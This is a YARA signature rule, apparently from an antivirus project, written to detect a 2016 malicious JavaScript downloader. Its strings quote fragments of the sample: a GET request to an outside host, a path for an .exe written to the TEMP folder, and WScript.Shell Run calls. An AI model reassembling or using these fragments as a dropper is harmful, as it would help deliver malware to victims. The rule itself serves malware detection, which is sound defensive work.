rule sig_20160329_1fb0eb590cbcf3d1a7353a6fa96432a1 {
  meta:
    description = "datamaliciousorder - file 20160329_1fb0eb590cbcf3d1a7353a6fa96432a1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3bbfaae6266b46175f94a52677e50b6085c8023141c6f859fc95a1d745c9776a"

  strings:
    $s1  = "ny[pZ](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function Fm() {return Bg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ovq1m0pp1503.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Mt](Rg() * 11); if (ny[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function If(p, PD){UT = UT * 1; return p - PD;};" fullword ascii
    $s5  = "var Bg = function o() {return WScript[q](\"WScript.Shell\");}(), H = 11;" fullword ascii
    $s6  = "function Xe(){return \"\" + HC;};" fullword ascii
    $s7  = "function d(TO){Bg[\"Run\"](TO, UT, UT);};" fullword ascii
    $s8  = "function mK() {return ((HR == true) && (HR == W)) ? 1 : UT;};" fullword ascii
    $s9  = "function g(r) {var pl = (1, 2, 3, 4, 5, r); return pl;};" fullword ascii
    $s10 = "function qB()" fullword ascii
    $s11 = "function Rg(){return 22;};" fullword ascii
    $s12 = "var eH = new this[\"Date\"]();" fullword ascii
    $s13 = "function gr(){return q;};" fullword ascii
    $s14 = "return If(c, GU);" fullword ascii
    $s15 = " while (yi){" fullword ascii
    $s16 = "HR = true; " fullword ascii
    $s17 = "var cV = false;" fullword ascii
    $s18 = "var HR = false;" fullword ascii
    $s19 = "var W = false;" fullword ascii
    $s20 = "W = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}